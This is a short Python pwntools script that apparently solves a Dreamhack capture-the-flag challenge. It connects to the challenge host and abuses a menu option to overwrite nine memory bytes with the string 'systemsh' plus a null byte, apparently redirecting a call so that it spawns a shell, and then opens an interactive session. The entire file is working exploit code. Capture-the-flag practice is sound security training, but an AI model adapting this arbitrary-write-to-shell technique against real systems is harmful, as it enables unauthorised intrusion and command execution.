from pwn import *

port = 16225
rem = remote("host1.dreamhack.games", port)

new_index = [0x492, 0x493, 0x494, 0x495, 0x496, 0x497, 0x2004, 0x2005, 0x2006]
new_string = "systemsh\x00"

for i in range(9):
  rem.sendlineafter(b">> ", b"3")
  rem.sendlineafter(b": ", str(int(new_index[i])).encode())
  rem.sendlineafter(b": ", b"y")
  rem.sendlineafter(b": ", str(ord(new_string[i:i+1])).encode())

rem.sendlineafter(b">> ", b"4")
rem.interactive()